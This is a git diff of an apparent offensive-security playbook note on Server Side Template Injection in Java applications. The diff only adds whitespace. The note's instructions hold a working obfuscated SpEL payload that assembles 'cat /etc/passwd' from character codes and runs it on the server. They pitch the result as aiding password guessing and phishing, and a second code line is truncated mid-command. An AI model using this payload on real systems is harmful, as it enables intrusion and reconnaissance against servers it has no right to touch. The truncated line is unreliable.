@@ -32,6 +32,8 @@ Technical Explanation: Java applications that use server-side templates are vuln
 
 Business Value: An attacker can use the information retrieved from /etc/passwd to gain a better understanding of the target system and its users. This information can be used to launch further attacks, such as password guessing or phishing attacks.
 
+ 
+
 ## Requirements
 
 1. Access to the vulnerable Java application
@@ -39,6 +41,8 @@ Business Value: An attacker can use the information retrieved from /etc/passwd t
 1. Knowledge of the Server Side Template Injection vulnerability
 
 1. Ability to inject code into the template
+
+ 
 
 ## Defense
 
@@ -48,9 +52,13 @@ Business Value: An attacker can use the information retrieved from /etc/passwd t
 
 1. Regularly update and patch vulnerable Java applications to prevent exploitation
 
+ 
+
 ## Objectives
 
 1. Retrieve the /etc/passwd file from the target system
+
+ 
 
 # Instructions
 
@@ -60,7 +68,13 @@ Business Value: An attacker can use the information retrieved from /etc/passwd t
 
 ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}'
 
+ 
+
+
+
 **Code**: [[${T(java.lang.Runtime).getRuntime().exec('cat etc/]]
+
+
 
 > This command will execute a shell command that will read the /etc/passwd file and then convert the output to a string using the IOUtils class. The resulting string will contain the contents of the /etc/passwd file.
 
@@ -79,3 +93,5 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 - [[Java]]
 - [[Java - Retrieve /etc/passwd]]
 - [[Server Side Template Injection]]
+
+
